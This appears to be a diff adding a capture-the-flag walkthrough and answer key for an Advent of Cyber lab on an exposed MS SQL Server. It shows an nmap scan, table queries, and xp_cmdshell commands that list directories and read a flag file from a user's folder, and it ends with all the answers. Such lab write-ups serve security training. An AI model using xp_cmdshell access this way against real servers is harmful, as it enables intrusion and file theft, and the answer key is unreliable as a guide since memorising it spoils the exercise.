@@ -1,0 +1,45 @@
+Advent of Cyber 3 - Day 11 {Networking - Where Are The Reindeers?
+////////Hints ++ Answers at the bottom////////
+
+Question 1: There is an open port related to MS SQL Server accessible over the network. What is the port number?
+{{Hint: nmap -Pn -sV -T4 [Machine IP]}}
+
+Question 2: If the connection is successful, you will get a prompt. What is the prompt that you have received?
+{{ xx }}
+
+Question 3: What is the first name of the reindeer of id 9?
+{{Hint: Red Nosed}}
+
+Question 4: Check the table schedule. What is the destination of the trip scheduled on December 7?
+{{Hint:}}
+1> SELECT * FROM reindeer.dbo.schedule;
+2> go
+
+Question 5: Check the table presents. What is the quantity available for the present “Power Bank”?
+{{Hint:}}
+1> SELECT * FROM reindeer.dbo.presents;
+2> go
+
+Question 6: There is a flag hidden in the grinch user's home directory. What are its contents?
+{{Hint:}}
+Traverse the system with:
+1> xp_cmdshell 'dir C:\path';
+2> go 
+
+Eventually, you will find the flag hidden under C:\Users\grinch\Documents\.
+To read:
+
+1> xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt';
+2> go
+
+
+
+
+
+///////Answers///////
+Question 1: 1433
+Question 2: 1>
+Question 3: rudolph
+Question 4: prague
+Question 5: 25000
+Question 6: THM{YjtKeUy2qT3v5dDH}
